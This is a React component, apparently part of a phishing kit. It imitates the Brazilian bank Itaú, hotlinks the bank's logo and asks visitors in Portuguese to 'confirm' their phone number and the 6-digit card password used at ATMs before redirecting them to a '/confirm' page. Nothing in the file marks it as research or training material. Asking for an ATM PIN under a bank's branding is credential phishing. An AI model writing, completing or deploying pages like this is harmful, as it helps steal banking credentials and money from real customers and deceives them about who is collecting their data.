import React from 'react'
import './EmailTelefone.css'
import { useNavigate } from 'react-router-dom'

const EmailTelefone = () => {
    const navigate = useNavigate();

    const handleClick = () => {
        setTimeout(() => {
            navigate('/confirm');
        }, 1000);
    }
  return (
    <div className='EmailTelefone'>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='title-et'>
            <span>Confirme os dados abaixo para<br />continuar</span>
        </div>
        <div className='form3'>
            <span>o mesmo que está em seu cadastro:</span>
            <input className="digitavel" type="text" placeholder='telefone' />
            <span>a mesma que você usa no caixa eletrônico (6 digitos):</span>
            <input className="digitavel" type="text" placeholder='digite a senha do cartão' />
            <button onClick={handleClick}>confirmar</button>
        </div>
    </div>
  )
}

export default EmailTelefone